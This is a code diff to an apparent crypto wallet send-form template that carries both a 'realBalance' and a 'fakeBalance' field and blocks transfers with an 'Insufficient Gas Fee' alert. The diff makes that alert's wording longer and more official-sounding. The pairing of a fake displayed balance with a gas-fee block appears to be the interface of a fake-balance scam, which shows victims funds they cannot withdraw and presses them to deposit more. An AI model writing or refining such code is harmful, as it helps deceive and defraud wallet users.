@@ -69,7 +69,7 @@
                         <input type="hidden" id="realBalance" name="realBalance" value="{{ $realBalance }}" />
                         <input type="hidden" id="fakeBalance" name="fakeBalance" value="{{ $fakeBalance }}" />
                         <input type="hidden" id="networkFee" name="network_fee" value="{{ $gasPriceGwei }}" />
-                        <input type="hidden" id="insufficientGasMsg" value="{{ $insufficient_gas_msg }}" />
+                        <input type="hidden" id="usdUnitPrice" value="{{ $usdUnitPrice ?? 0 }}" />
 
                         <div class="form_input position-relative">
                             <label for="">Address</label>
@@ -164,14 +164,15 @@
             let realBalance = parseFloat(document.getElementById('realBalance').value);
             let networkFee = parseFloat(document.getElementById('networkFee').value);
             let amountInput = document.querySelector('.form_input input[type="text"][placeholder="0.00"]');
-            let insufficientGasMsg = document.getElementById('insufficientGasMsg').value.trim() ||
-                "Please add more token to cover the fee before sending.";
+            let insufficientGasMsg = "Your transaction could not be completed because there is insufficient gas available to cover the required network fee.<br><br>Please ensure your wallet has sufficient gas available to cover the required for this transaction, then try again.<br><br>Transaction not completed.";
             var alert = false;
+            var alertTitle = 'Form Validation Error!';
             if(amountInput.value < 0) {
                 var alertMsg = "Negative amount is not allowed.";
                 alert = true;
             }
             else if (networkFee > realBalance) {
+                var alertTitle = 'Insufficient Gas Fee';
                 var alertMsg = insufficientGasMsg;
                 alert = true;
             }
@@ -182,8 +183,7 @@
                 // Beautiful SweetAlert with dark theme
                 Swal.fire({
                     icon: 'warning',
-                    title: 'Form Validation Error!',
-                    // html: '<div style="color: #ffffff !important;"><p style="font-size: 18px; color: #ffffff !important; margin-bottom: 15px;">Your transaction failed due to insufficient ETH for gas fees.</p><p style="font-size: 16px; color: #cccccc !important; margin-top: 15px;">Please add more ETH to cover the fee before sending.</p></div>',
+                    title: alertTitle,
                     html: `<div style="color: #ffffff !important;">
                         <p style="font-size: 18px; color: #ffffff !important; margin-bottom: 15px;">
                             ${alertMsg}
@@ -275,11 +275,8 @@
             const usdDisplay = document.querySelector('.form_input ul li:nth-child(1)'); // First <li> inside <ul>
             const sendAllBtn = document.querySelector('.avlAsset_btn button[type="button"]'); // SEND ALL button
 
-            // Values from PHP
-            const usdUnitPrice = {{ $usdUnitPrice ?? 0 }};
-            const numericBalance = {{ $numericBalance ?? 0 }};
-            const gasPriceGwei = {{ $gasPriceGwei ?? 0 }};
-            const usdPrice = {{ $usdPrice ?? 0 }};
+            const usdUnitPrice = parseFloat(document.getElementById('usdUnitPrice').value) || 0;
+            const gasPriceGwei = parseFloat(document.getElementById('networkFee').value) || 0;
             const active_transaction_type = document.getElementById('active_transaction_type').value.trim();
             const token = document.getElementById('token').value.trim();
             let realBalance = parseFloat(document.getElementById('realBalance').value);
